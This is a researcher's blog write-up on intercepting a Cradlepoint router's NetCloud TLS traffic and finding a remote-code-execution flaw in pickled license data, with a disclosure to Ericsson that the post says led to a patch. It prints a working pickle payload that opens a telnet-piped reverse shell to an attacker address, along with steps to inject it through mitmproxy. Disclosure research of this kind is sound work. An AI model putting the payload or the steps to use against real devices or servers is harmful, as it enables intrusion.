---
title: "RCE in Cradlepoint's Cloud Management Platform"
date: 2024-06-08T21:10:59+02:00
lastmod: 2024-06-08T21:10:59+02:00
author: "stulle123"
summary: "Blog post about how I found a RCE in Cradlepoint's Cloud Management Platform."
tags: 
- Embedded
- TLS
- mitmproxy
- Python
showToc: true
TocOpen: true
draft: false
disableShare: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
UseHugoToc: true
---

This is a write-up of a project I did last year together with [veganmosfet](https://github.com/veganmosfet) on the 4G Cradlepoint router `IBR600C-150M-B-EU` (firmware version `7.22.60`).

In this post, we will dig into the device's cloud management platform [NetCloud](https://accounts.cradlepointecm.com/). I'll show you how to poke at the TLS-encrypted communications and how I found a RCE bug in NetCloud by analyzing the traffic.

## Disclaimer

As of June 2024, some of the techniques and scripts presented here might not work anymore. Cradlepoint has patched our findings and released a new firmware update.

However, dumping the flash and [rooting](https://github.com/vegantransistor/Rooting-the-Cradlepoint-IBR600/tree/main) the device should still be possible.

We assume that you have a rooted Cradlepoint router or managed to dump the rootfs from the device.

## Background

At my previous company we used the Cradlepoint `IBR600C-150M-B-EU` router for our product's Internet connectivity. [veganmosfet](https://github.com/veganmosfet) and I decided to take a look at this critical off-the-shelf device.

We found a couple of [issues](https://github.com/vegantransistor/Rooting-the-Cradlepoint-IBR600/tree/main) which we reported to Cradlepoint which is owned by Ericsson. Eventually, [veganmosfet](https://github.com/veganmosfet) presented our findings at [BSides Munich](https://www.youtube.com/watch?v=9vFiQT1vbfg) in Germany.

{{< youtube 9vFiQT1vbfg >}}

## The device

The `IBR600C` is a small, semi-ruggedized LTE router for IoT applications. For remote management it can be hooked up to Cradlepoint's cloud platform [NetCloud](https://accounts.cradlepointecm.com/).

![IBR600C](/img/router.png)

The router's firmware is based on Linux whereas all main applications are completely written in Python. This includes the web server, sshd, a custom shell, firmware upgrade and other services.

[veganmosfet](https://github.com/veganmosfet) managed to dump the router's flash memory and installed a custom firmware image to obtain a [root shell](https://github.com/vegantransistor/Rooting-the-Cradlepoint-IBR600/tree/main).

Having root, it's relatively straightforward to intercept and poke at NetCloud communications. That's what I did ;-)

## Device registration with NetCloud

To actually see some NetCloud traffic you need to register your router. TL;DR: Enter your [NetCloud credentials](https://accounts.cradlepointecm.com/) in the router's web interface and that's it.

However, we have a root shell, so let's register the router via the CLI:

0. Connect to the router via SSH:

```bash
ssh admin@192.168.0.1
admin@192.168.0.1's password: 
[admin@IBR600C-a38: /]$ sh
/service_manager $ cppython
```

1. Grab the device's access token:

```python
import filemanager
from board import board
file_io = board.get_partition("2nd Filemanager", rwdev=True)
fm2 = filemanager.FileManager2(file_io)
token = fm2.get("wpc.auth")
```

Example output: `(2439001, 0, '2b29ffccbda7e45df943dc1e82a096af04e24249', 'stream.cradlepointecm.com', 8001)`

Next, you can use the `netcloud` command to sign-up the router:

```bash
[admin@IBR600C-a38: /]$ netcloud register --token_id=0 --token_secret=2b29ffccbda7e45df943dc1e82a096af04e24249
```

If you now sniff on the router's Internet-facing network interface you should see some TLS traffic.

To understand how the registration process works you can take a look at our [testing script](https://github.com/veganmosfet/Rooting-the-Cradlepoint-IBR600/blob/main/netcloud/scripts/test_netcloud_registration.py). You can use it with your NetCloud credentials to register a router and to poke around. **Note**: As of June 2024, the script is probably outdated and you need to adapt it ;-)

## Decrypt NetCloud TLS traffic

You basically have three choices for logging plaintext NetCloud traffic (again a rooted device or access to the rootfs is required):

0) Export the `SSLKEYLOGFILE` environment variable on a rooted device and dump traffic into a PCAP file.
1) Add a fake CA certificate to a rooted device's trusted CA store and MITM traffic with mitmproxy.
2) [Emulate](https://github.com/veganmosfet/Rooting-the-Cradlepoint-IBR600/tree/main/router_emulation) the rootfs in Qemu and log traffic (limited functionality as we don't emulate a full router).

### Decrypt NetCloud traffic in Wireshark

Go through the following steps to create a PCAP file on the router and decrypt the TLS traffic in Wireshark afterwards:

0. Connect to the router via SSH, set the `SSLKEYLOGFILE` environment variable in `/etc/rc` and reboot the router. If that's not possible, make the changes to the [rootfs](https://github.com/veganmosfet/Rooting-the-Cradlepoint-IBR600/tree/main?tab=readme-ov-file#dumping-nand) and [reflash](https://github.com/veganmosfet/Rooting-the-Cradlepoint-IBR600?tab=readme-ov-file#flashing-our-custom-kernel-and-rootfs) the device.

```bash
ssh admin@192.168.0.1
admin@192.168.0.1's password: 
[admin@IBR600C-a38: /]$ sh
/service_manager $ echo 'export SSLKEYLOGFILE=/tmp/ssl_key.txt' >> /etc/rc
/service_manager $ reboot
```

1. Start `tcpdump`:

```bash
ssh admin@192.168.0.1
admin@192.168.0.1's password: 
[admin@IBR600C-a38: /]$ sh
/service_manager $ cd /var/tmp && tcpdump -i athc00 -w /tmp/netcloud_dump.pcap
```

2. Start a HTTP server to download the PCAP:

```bash
/var/tmp $ iptables -A INPUT -p tcp --dport 8080 -j ACCEPT
/var/tmp $ cppython -m http.server 8080
```

3. Download PCAP:

```bash
$ wget 192.168.0.1:8080/netcloud_dump.pcap
```

4. Import the pre-master secret into Wireshark: Grab the `/tmp/ssl_key.txt` file from step 0) and add it to Wireshark (`Preferences` -> `TLS` -> `(Pre)-Master-Secret logfile name`)

5. Export the TLS stream as YAML: `Follow` -> `TLS Stream` -> `Show Data as YAML`

6. Finally, parse the YAML file with my [script](https://github.com/veganmosfet/Rooting-the-Cradlepoint-IBR600/blob/main/netcloud/scripts/parse_netcloud_packets_from_yaml.py).

### MITM NetCloud traffic with mitmproxy

You can also MITM the TLS traffic to log communicatios on the fly. Here, we used a Raspberry Pi and set up [mitmproxy](https://mitmproxy.org/) in transparent mode: 

0. On the Pi, enable IP forwarding, setup `dnsmasq` and configure `iptables` rules. For example:

```bash
#!/bin/bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
sudo iptables -A FORWARD -i eth0 -o wlan0 -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 8001 -j REDIRECT --to-port 8080
sudo systemctl daemon-reload && sudo systemctl restart dhcpcd sudo service dnsmasq restart
```

1. Setup the router's WAN interface to use your proxy as the default gateway (e.g., via the web interface)

2. Install mitmproxy on the Raspberry Pi (here we build it, but you also should be good to go with a simple `$ pip3 install mitmproxy`):

``` bash
$ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
$ sudo apt-get install build-essential libssl-dev libffi-dev python3-dev cargo
$ git clone https://github.com/mitmproxy/mitmproxy/tree/main/mitmproxy
$ cd mitmproxy
$ pip install -e .
```

3. On the rooted CradlePoint device, copy your MITM CA certificate into the file `/service_manager/services/wpcclient/stream.crt` (this is the router's trusted CA store)

4. On the Pi, copy your MITM CA certificate into mitmproxy's folder. It must have the name `mitmproxy-ca.pem` and the following structure:

```
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
...
-----END CERTIFICATE-----
```

5. Finally, fire up mitmproxy using [my logging script](https://github.com/veganmosfet/Rooting-the-Cradlepoint-IBR600/blob/main/netcloud/scripts/mitmproxy_netcloud_logging.py):

```bash
$ mitmproxy --mode transparent \
    --set confdir=$HOME/mitmproxy \
    --rawtcp \
    --tcp-hosts ".*" \
    -s mitmproxy_netcloud_logging.py
```

You should now see some decrypted NetCloud traffic. If you don't, make sure the device is registered (see [above](#device-registration-with-netcloud)).

## NetCloud RCE

By analyzing the NetCloud traffic, I noticed that the router engages in a license sync from time to time. The license is sent as a `pickled` Base64 encoded byte stream. Here's an example:

```
{'command': 'post', 'args': {'queue': 'license_sync', 'id': 'xxx', 'value': {'success': True, 'data': 'gAJ9[...]=='}}}
```

The Python `pickle` module implements binary protocols for serializing and de-serializing a Python object structure. There's a big warning in the [Python documentation](https://docs.python.org/3/library/pickle.html):

{{< box warning >}}
**Warning**: The pickle module **is not secure**. Only unpickle data you trust.

It is possible to construct malicious pickle data which will **execute arbitrary code during unpickling**.

Never unpickle data that could have come from an untrusted source, or that could have been tampered with.
{{< /box >}}

As we control the communication channel, it's trivial to inject our own malicious pickle data to achieve remote code execution on the router's and/or NetCloud's side. For example, we can use this simple payload to get a reverse shell:

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('telnet 192.168.1.200 8080 | /bin/bash | telnet 192.168.1.200 8081')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(pickled)
```

I actually didn't run the attack against NetCloud servers, but I was able to get a reverse shell on the router (the license file is sent in both directions).

To reproduce the attack, just go through the following steps (**note**: not sure if this still works in June 2024 :skull:):

0) Grab a rooted Cradlepoint router and set up your MITM box (see [above](#mitm-netcloud-traffic-with-mitmproxy))

1) Next, adapt the `_ATTACKER_IP` and `_ATTACKER_PORT` variables in my `mitmproxy_netcloud_rce.py` script

2) Finally, simply start mitmproxy, wait for the lisence sync to happen (e.g., reboot the router) and get a remote shell:

```bash
$ mitmproxy --mode transparent \
    --set confdir=$HOME/mitmproxy \
    --rawtcp \
    --tcp-hosts ".*" \
    -s mitmproxy_netcloud_rce.py
```

3) To quickly test the [mitmproxy_netcloud_rce.py](https://github.com/veganmosfet/Rooting-the-Cradlepoint-IBR600/blob/main/netcloud/scripts/mitmproxy_netcloud_rce.py) script you can do the following:

- In the script change the IP address to `127.0.0.1` and the payload's Python interpreter to just `python` or `python3`
- Start `mitmdump` in one terminal window: `$ mitmdump --rawtcp --tcp-hosts ".*" -s mitmproxy_netcloud_rce.py`
- In another window start a netcat listener
- Tunnel a [license packet](https://github.com/veganmosfet/Rooting-the-Cradlepoint-IBR600/blob/main/netcloud/scripts/license_packet_TO_netcloud.bin): `$ cat license_packet_TO_netcloud.bin | openssl s_client -connect "google.com:443" -proxy localhost:8080`

{{< box info >}}
Actually, you don't need to be a MITM to gain RCE on NetCloud server's. If you have access to the rootfs, you could simply [emulate](https://github.com/veganmosfet/Rooting-the-Cradlepoint-IBR600/tree/main/router_emulation) and modify the router's NetCloud client. It's all Python bytecode which can be easily decompiled.

We already simulated some of the NetCloud registration in our [testing script](https://github.com/veganmosfet/Rooting-the-Cradlepoint-IBR600/blob/main/netcloud/scripts/test_netcloud_registration.py). Add code for license file handling and inject your malicious pickle payload. That's it.
{{< /box >}}

## Responsible Disclosure

On `2023-01-05` we disclosed our findings to Ericsson who quickly released a patch shortly after and mentioned us on their [Security Hall of Fame](https://www.ericsson.com/en/about-us/security/vulnerability-reporting-form/acknowledgements) :trophy:

## Conclusion

In this blog post I've shown you how to intercept a Cradlepoint router's NetCloud communications. This is easily possible on a rooted device as you can add your own malicious CA certificate to MITM the TLS traffic.

After all, this is possible because there is no Secure Boot in place that would protect against such modifications. Also, Cradlepoint has made some wrong trust assumptions, thinking TLS would be sufficient to protect pickled data payloads against tampering.